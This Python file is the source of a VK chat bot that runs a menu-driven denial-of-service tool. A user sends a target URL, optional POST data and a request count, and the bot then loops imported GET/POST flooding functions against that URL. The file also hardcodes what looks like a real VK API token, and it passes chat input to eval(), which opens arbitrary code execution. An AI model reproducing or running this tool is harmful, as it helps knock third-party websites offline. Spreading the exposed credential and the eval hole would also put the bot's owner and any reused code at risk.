from vk_api import VkApi
from vk_api.utils import get_random_id
from vk_api.longpoll import VkLongPoll, VkEventType
from POST import postDDoS
from GET import getDDoS


token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce'

vk_session = VkApi(token=token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)



def message(message):
    vk.messages.send(
        peer_id = '300610283',
        message = message,
        random_id = get_random_id(),
    )

def mainDDoS():
    try:
        message('Выберите тип DDoS:')
        message('GET')
        message('POST')
        message('Для того чтобы выйти в главное меню введите "Выход"')
        for event in longpoll.listen():
            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                if event.text == 'Назад':
                    message('Выберите тип DDoS:')
                    message('GET')
                    message('POST')
                    message('Для того чтобы выйти в главное меню введите "Выход"')
                    break
                elif event.text == 'Выход':
                    message('Выходим...')
                    break
                elif event.text == 'GET':
                    message('Введите ссылку. Для того чтобы вернуться назад "Назад"')
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад':
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text == 'Выход':
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text != 'Назад':
                                url = event.text
                                message('Введите число запросов. Для того чтобы вернуться назад "Назад"')
                                for event in longpoll.listen():
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад':
                                            message('Введите ссылку. Для того чтобы вернуться назад "Назад"')
                                            break
                                        elif event.text == 'Выход':
                                            message('Выходим...')
                                            break
                                        elif event.text != 'Назад':
                                            message(url + ' - Идет DDoS...')
                                            for i in range(int(event.text)):
                                                getDDoS(url)
                                            message('DDoS закончен! Для выхода введите "Выход"')
                                            break
                elif event.text == 'POST':
                    message('Введите ссылку. Для того чтобы вернуться назад "Назад".')
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад':
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text == 'Выход':
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text == 'Выход':
                                message('Выходим...')
                                break
                            elif event.text != 'Назад':
                                url = event.text
                                print(url)
                                message('Введите кортеж data. Для того чтобы вернуться назад "Назад"')
                                for event in longpoll.listen():
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад':
                                            message('Введите ссылку. Для того чтобы вернуться назад "Назад".')
                                            break
                                        elif event.text == 'Выход':
                                            message('Введите "Выход" еще раз')
                                            break
                                        elif event.text != 'Назад':
                                            data = event.text
                                            dict = eval(data)
                                            message('Введите число запросов. Для того чтобы вернуться назад "Назад"')
                                            for event in longpoll.listen():
                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                                    if event.text == 'Назад':
                                                        message('Введите кортеж data. Для того чтобы вернуться назад "Назад"')
                                                        break
                                                    elif event.text == 'Выход':
                                                        message('Выходим...')
                                                        break
                                                    elif event.text != 'Назад':
                                                        print(dict)
                                                        message(url + ' - Идет DDoS...')
                                                        for i in range(int(event.text)):
                                                            postDDoS(url, dict)
                                                        message('DDoS закончен! Для выхода введите "Выход"')
                                                        break
    except:
        message('Произошла ошибка.')






